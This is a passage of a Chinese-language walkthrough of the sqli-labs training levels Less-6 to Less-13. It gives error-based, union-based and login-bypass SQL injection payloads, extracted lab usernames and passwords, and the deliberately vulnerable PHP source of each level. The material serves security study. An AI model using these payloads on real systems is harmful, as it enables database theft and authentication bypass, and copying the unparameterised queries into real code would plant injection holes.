+1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+<br>
+1&quot; and extractvalue(1,concat(0x7e,database(),0x7e))–+<br>
+ 当前数据库：security</p>
+</li>
+<li>
+<p>爆表<br>
+ 1&quot; and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ()),0x7e),1)–+<br>
+security 数据库：emails,referers,uagents,users</p>
+</li>
+<li>
+<p>爆列<br>
+ 1&quot; and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_name=‘users’),0x7e),1)–+<br>
+USER,CURRENT_CONNECTIONS,TOTAL<br>
+ 没完全爆出来，建议使用盲注，left（）,right () 函数在这里貌似不行<br>
+ 1&quot; and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e),1) --+<br>
+ 不断更改 limit () 取值范围即可<br>
+发现有 username,password</p>
+</li>
+<li>
+<p>爆值<br>
+ 1&quot; and updatexml (1,concat (0x7e,(select group_concat (username,password) from (security.users)),0x7e),1)–+<br>
+DumbDumb,AngelinaI-kill-you,Dum<br>
+ 同理不断更改 limit () 就可得到全部内容</p>
+</li>
+<li>
+<p>代码</p>
+</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h2><span id="19-sqli-labs-masterless-7"> 19. sqli-labs-master/Less-7</span></h2>
+<p>字符型布尔、时间</p>
+<ol>
+<li>
+<p>判断<br>
+ sqlmap 跑一下，发现是布尔和时间盲注</p>
+</li>
+<li>
+<p>盲注<br>
+既然是盲注，那就手工操作或者 sqlmap、脚本跑一下，手工比较麻烦，在这里我采取无脑 sqlmap 跑一下</p>
+</li>
+<li>
+<p>代码</p>
+</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>发现 mysql_error () 被注释掉，所以报错、联合查询不了</p>
+<h2><span id="20-sqli-labs-masterless-8"> 20. sqli-labs-master/Less-8</span></h2>
+<p>字符型布尔、时间（’,%’）</p>
+<ol>
+<li>
+<p>判断<br>
+ sqlmap 跑一下，发现是布尔或时间盲注</p>
+</li>
+<li>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2><span id="21-sqli-labs-masterless-9"> 21. sqli-labs-master/Less-9</span></h2>
+<p>字符型布尔、时间（’,%’）</p>
+<ol>
+<li>判断<br>
+布尔、时间盲注</li>
+<li>代码</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125; </span><br></pre></td></tr></table></figure>
+<h2><span id="22-sqli-labs-masterless-10sqlmap-没跑出来"> 22. sqli-labs-master/Less-10（sqlmap 没跑出来！！！)</span></h2>
+<p>字符型布尔、时间（&quot;,’&quot;）<br>
+手工实现时间盲注<br>
+盲注为双引号盲注</p>
+<ul>
+<li>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2><span id="23-sqli-labs-masterless-11"> 23. sqli-labs-master/Less-11</span></h2>
+<p>字符型联合、报错、布尔、时间<br>
+’</p>
+<ol>
+<li>
+<p>首先它是 post 型，其次发现万能密码可行，至此发现一条普遍规律<br>
+在 url 中建议用–+ 注释，在 POST 注入中用 #注释</p>
+</li>
+<li>
+<p>查看源代码，发现字符型联合注入，报错注入都可</p>
+</li>
+<li>
+<p>使用 salmap 没跑出来</p>
+</li>
+<li>
+<p>判断<br>
+使用 1，1’字符型</p>
+</li>
+<li>
+<p>判断字段数<br>
+ 1’ order by 2 #<br>
+1’ order by 3 #<br>
+字段数为 2</p>
+</li>
+<li>
+<p>显位<br>
+ 1’ union select 1,2 #<br>
+1,2 位置成功显示出来</p>
+</li>
+<li>
+<p>爆库<br>
+ 1’ union select 1,group_concat (schema_name) from (information_schema.schemata) #</p>
+</li>
+<li>
+<p>爆表<br>
+ 1’ union select 1,group_concat (table_name) from information_schema.tables where table_schema=database () #</p>
+</li>
+<li>
+<p>爆列</p>
+</li>
+<li>
+<p>爆值</p>
+</li>
+<li>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot; You Have successfully logged in\n\n &quot; ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2><span id="24-sqli-labs-masterless-12"> 24. sqli-labs-master/Less-12</span></h2>
+<p>字符型联合、报错、布尔、时间<br>
+与上一题思路一样，只是变成 &quot;)</p>
+<ul>
+<li>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">	@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2><span id="25-sqli-labs-masterless-13sqlmap-布尔没跑出来"> 25. sqli-labs-master/Less-13（sqlmap 布尔没跑出来！！！)</span></h2>
+<p>字符型报错、布尔、时间<br>
+额。还是类似，只不过变成’)</p>
+<ul>
+<li>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line">		<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">		<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">		<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> 